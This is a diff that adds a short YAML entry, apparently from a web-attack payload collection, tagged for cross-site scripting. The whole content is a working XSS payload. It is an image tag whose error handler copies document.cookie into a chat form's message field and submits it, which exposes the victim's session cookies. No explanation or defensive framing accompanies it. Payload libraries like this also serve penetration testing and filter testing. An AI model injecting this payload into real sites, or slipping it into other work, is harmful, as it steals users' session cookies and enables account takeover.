@@ -1,0 +1,9 @@
+---
+metadata:
+  filename: "xss-img-submit-form.yaml"
+  tags: ["web", "xss"]
+  created: "2025-04-04"
+  author: "@anakles"
+
+content: |
+  <img src=1 onerror='const form = document.getElementById("chatform");form.elements["msg"].value = document.cookie;form.requestSubmit()';>
